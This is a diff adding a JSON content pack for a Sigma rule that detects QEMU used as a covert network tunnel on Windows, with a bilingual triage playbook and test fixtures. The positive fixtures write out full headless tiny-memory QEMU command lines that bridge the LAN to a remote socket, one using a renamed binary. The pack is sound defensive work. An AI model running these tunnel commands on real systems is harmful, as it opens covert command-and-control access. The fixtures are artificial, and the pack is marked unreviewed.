@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "5fc297ae-25b6-488a-8f25-cc12ac29b744",
+    "title": "Potentially Suspicious Usage Of Qemu",
+    "level": "medium",
+    "status": "test",
+    "author": "Muhammad Faisal (@faisalusuf), Hunter Juhan (@threatHNTR)",
+    "path": "windows/process_creation/proc_creation_win_qemu_suspicious_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_qemu_suspicious_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1090",
+      "T1572"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó QEMU en un host Windows con una VM de 1 a 3 MB de RAM, sin interfaz gráfica y con red por socket hacia un destino remoto. Este patrón coincide con el uso de QEMU como túnel de red encubierto, no como virtualización real.",
+      "what_it_detects": "Eventos de creación de procesos cuyo CommandLine contiene '-m 1M', '-m 2M' o '-m 3M' junto con 'restrict=off', '-netdev ', 'connect=' y '-nographic', salvo que también incluya ' -cdrom ', ' type=virt ' o ' -blockdev ', que indican uso normal.",
+      "why_it_matters": "Con tan poca memoria la VM no puede arrancar un sistema operativo; QEMU funciona solo como puente de red que conecta la LAN interna a un servidor externo. Esto corresponde a proxy (T1090) y tunelización de protocolos (T1572) para comando y control y acceso persistente a la red.",
+      "triage_steps": [
+        "Revisa el CommandLine completo: extrae la IP y el puerto de 'connect=' y confirma si hay un netdev 'user' con restrict=off unido por hubport al socket.",
+        "Verifica Image, su ruta y el hash; QEMU puede estar renombrado o ubicado en carpetas como ProgramData, Temp o perfiles de usuario.",
+        "Analiza ParentImage y la cadena de procesos: un lanzamiento desde cmd, PowerShell, tareas programadas o servicios remotos es más sospechoso que desde un hipervisor instalado.",
+        "Identifica al usuario y la sesión de inicio; correlaciona con autenticaciones RDP, VPN o de red en el mismo host dentro de +/- 15 minutos.",
+        "Busca en telemetría de red conexiones salientes hacia la IP de connect= y consulta su reputación y si otros hosts también se conectan.",
+        "Revisa creación de archivos en el host (binarios y DLL de QEMU, scripts) y mecanismos de persistencia como servicios o tareas.",
+        "Consulta alertas previas del mismo host, usuario e IP remota, incluyendo herramientas de túnel o acceso remoto."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos.",
+        "Pruebas de laboratorio de redes o investigación de seguridad que reproducen la técnica de túnel con QEMU, previamente autorizadas.",
+        "Ejercicios de red team o pentesting aprobados; confirma con el equipo responsable y la ventana de prueba."
+      ],
+      "response_steps": [
+        "Confirma con el usuario o el dueño del sistema si la ejecución está autorizada antes de actuar.",
+        "Si no está autorizada, aísla el endpoint y bloquea la IP y el puerto de connect= en el firewall perimetral.",
+        "Preserva evidencia: volcado de memoria del proceso, binarios de QEMU, hashes y registros de red antes de terminar el proceso.",
+        "Termina el proceso, elimina QEMU y la persistencia asociada, y restablece las credenciales de las cuentas usadas.",
+        "Busca el mismo hash, ruta o IP remota en toda la flota y revisa movimiento lateral desde el host afectado."
+      ],
+      "severity_rationale": "Nivel medio: el conjunto de parámetros es muy específico de tunelización, pero sin contexto adicional puede tratarse de pruebas autorizadas."
+    },
+    "en": {
+      "summary": "QEMU ran on a Windows host with a 1–3 MB RAM VM, no graphics and socket networking to a remote endpoint. This pattern matches QEMU abused as a covert network tunnel, not real virtualization.",
+      "what_it_detects": "Process creation events whose CommandLine contains '-m 1M', '-m 2M' or '-m 3M' plus 'restrict=off', '-netdev ', 'connect=' and '-nographic', unless it also has ' -cdrom ', ' type=virt ' or ' -blockdev ', which indicate normal use.",
+      "why_it_matters": "A VM with so little memory cannot boot an OS; QEMU only bridges the internal LAN to an external server. This is proxying (T1090) and protocol tunneling (T1572) for command and control and persistent network access.",
+      "triage_steps": [
+        "Read the full CommandLine: extract the IP and port from 'connect=' and check for a 'user' netdev with restrict=off joined to the socket via hubport.",
+        "Check Image path and hash; QEMU may be renamed or placed in ProgramData, Temp or user profile folders.",
+        "Review ParentImage and the process tree: launches from cmd, PowerShell, scheduled tasks or remote services are more suspicious than from an installed hypervisor.",
+        "Identify the user and logon session; correlate with RDP, VPN or network logons on the same host within +/- 15 minutes.",
+        "Search network telemetry for outbound connections to the connect= IP, check its reputation and whether other hosts contact it.",
+        "Look for file drops on the host (QEMU binaries, DLLs, scripts) and persistence such as services or tasks.",
+        "Check earlier alerts for the same host, user and remote IP, including other tunneling or remote access tools."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives.",
+        "Authorized network lab or security research reproducing the QEMU tunneling technique.",
+        "Approved red team or penetration testing; confirm with the owning team and test window."
+      ],
+      "response_steps": [
+        "Confirm with the user or system owner whether the execution is authorized before acting.",
+        "If unauthorized, isolate the endpoint and block the connect= IP and port at the perimeter firewall.",
+        "Preserve evidence: process memory dump, QEMU binaries, hashes and network logs before killing the process.",
+        "Kill the process, remove QEMU and related persistence, and reset credentials of the accounts involved.",
+        "Hunt for the same hash, path or remote IP across the fleet and review lateral movement from the host."
+      ],
+      "severity_rationale": "Medium: the parameter combination is highly specific to tunneling, but without further context it may be authorized testing."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "QEMU with 1 MB RAM bridging the LAN to a remote socket, headless (tunneling pattern).",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.local",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\ProgramData\\qemu\\qemu-system-i386.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "qemu-system-i386.exe -m 1M -netdev user,id=lan,restrict=off -netdev socket,id=sock,connect=203.0.113.10:443 -netdev hubport,id=port-lan,hubid=0,netdev=lan -netdev hubport,id=port-sock,hubid=0,netdev=sock -nographic",
+          "ProcessId": 6120
+        }
+      },
+      {
+        "description": "Renamed QEMU binary with 2 MB RAM launched from PowerShell, same tunnel flags.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FS-03.andes.local",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Users\\Public\\vmhost.exe",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "C:\\Users\\Public\\vmhost.exe -m 2M -nographic -netdev user,id=a,restrict=off -netdev socket,id=b,connect=198.51.100.25:8443 -netdev hubport,id=p1,hubid=0,netdev=a -netdev hubport,id=p2,hubid=0,netdev=b",
+          "ProcessId": 4432
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Normal lab VM with 2048M RAM booting an ISO via -cdrom.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.local",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Program Files\\qemu\\qemu-system-x86_64.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "\"C:\\Program Files\\qemu\\qemu-system-x86_64.exe\" -m 2048M -cdrom C:\\iso\\alpine.iso -netdev user,id=n1 -device e1000,netdev=n1",
+          "ProcessId": 7012
+        }
+      },
+      {
+        "description": "Headless socket-networked VM but with 512M RAM, so no tiny-memory flag matches.",
+        "event": {
+          "EventID": 1,
+          "Computer": "LAB-NET-01.andes.local",
+          "User": "ANDES\\lab_admin",
+          "Image": "C:\\Program Files\\qemu\\qemu-system-x86_64.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "qemu-system-x86_64.exe -m 512M -hda C:\\vms\\router.qcow2 -netdev user,id=lan,restrict=off -netdev socket,id=sock,connect=192.0.2.50:5555 -nographic",
+          "ProcessId": 3388
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
